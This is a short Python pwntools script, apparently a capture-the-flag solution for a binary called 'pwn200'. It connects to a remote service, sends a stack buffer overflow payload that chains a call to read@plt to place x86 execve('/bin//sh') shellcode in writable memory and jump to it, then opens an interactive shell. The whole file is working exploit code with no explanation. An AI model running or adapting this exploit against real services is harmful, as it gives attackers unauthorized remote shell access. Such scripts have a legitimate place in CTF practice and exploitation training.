from pwn import *


#r = process("./pwn200")
r = remote("54.153.19.139",5254)
#raw_input()

SC ="\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"



writeable = 0x0804a000+4
readplt = 0x08048350

payload  = "A"*28
payload += p32(readplt)
payload += p32(writeable)
payload += p32(0)
payload += p32(writeable)
payload += p32(len(SC)+1)

r.recv()
r.sendline(payload)
r.sendline(SC)

r.interactive()